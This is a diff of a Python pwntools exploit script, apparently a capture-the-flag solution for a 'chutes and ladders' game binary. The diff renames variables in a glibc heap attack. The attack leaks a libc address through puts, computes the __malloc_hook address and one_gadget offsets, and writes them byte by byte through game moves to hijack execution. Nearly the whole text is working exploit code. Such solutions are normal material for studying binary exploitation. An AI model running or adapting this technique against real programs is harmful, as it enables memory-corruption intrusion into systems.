@@ -50,8 +50,8 @@ def main():
     sla("What did you spin? (1-6): ",str(6))
     io.recvuntil("0x")
     libc_addr=int(io.recv(12),16)-libc.sym['puts']
-    free_hook=libc_addr+libc.sym["__malloc_hook"]-4
-    system=libc_addr+[0xe6c7e ,0xe6c81 ,0xe6c84][1]
+    malloc_hook=libc_addr+libc.sym["__malloc_hook"]-4
+    ogg=libc_addr+[0xe6c7e ,0xe6c81 ,0xe6c84][1]
     print("libc_addr==>"+hex(libc_addr))
     sla("Would you like to change the chutes and ladders? (y/n): ",'n')#1 0
     #free -> bins  vitcm->bins
@@ -64,18 +64,18 @@ def main():
         turn(3)#1 3 2-9 4
     turn(4)#10 7->3
     
-    turn(3,p8((free_hook>>(8*(0)))&0xff),'y') #1->7->3
+    turn(3,p8((malloc_hook>>(8*(0)))&0xff),'y') #1->7->3
     for i in range(7):
-        turn(3,p8((free_hook>>(8*(i+1)))&0xff),'y')#2-8 3
+        turn(3,p8((malloc_hook>>(8*(i+1)))&0xff),'y')#2-8 3
     turn(4)#9 5
     turn(1)#10 4
     for i in range(8):
         turn(4)#1-8 3
     turn(3)#9 8 
     turn(6)#10 10
-    turn(6,p8((system>>(8*(0)))&0xff),'y')#1 7
+    turn(6,p8((ogg>>(8*(0)))&0xff),'y')#1 7
     for i in range(7):
-        turn(6,p8((system>>(8*(i+1)))&0xff),'y')#2-8  9
+        turn(6,p8((ogg>>(8*(i+1)))&0xff),'y')#2-8  9
     # turn(6,p8(0),'y')#10
     turn(1)#9
     turn(2)#10
@@ -83,11 +83,11 @@ def main():
     turn(2)#2
     turn(2)#3
     turn(2)#4
-    turn(4,p8((system>>(8*(0)))&0xff),'y')#5
+    turn(4,p8((ogg>>(8*(0)))&0xff),'y')#5
     for i in range(3):
-        turn(4,p8((system>>(8*(i+1)))&0xff),'y')#2-8  9
-    turn(3,p8((system>>(8*(3+1)))&0xff),'y')
-    turn(1,p8((system>>(8*(4+1)))&0xff),'y')
+        turn(4,p8((ogg>>(8*(i+1)))&0xff),'y')#2-8  9
+    turn(3,p8((ogg>>(8*(3+1)))&0xff),'y')
+    turn(1,p8((ogg>>(8*(4+1)))&0xff),'y')
     sla("Would you like to change your marker? (y/n): ",'n')
     #gdb.attach(io,"b *0x1BC7+0x555555554000\nb *0x7ffff7dbd000"+hex(system))
     sla("What did you spin? (1-6): ",str(6))
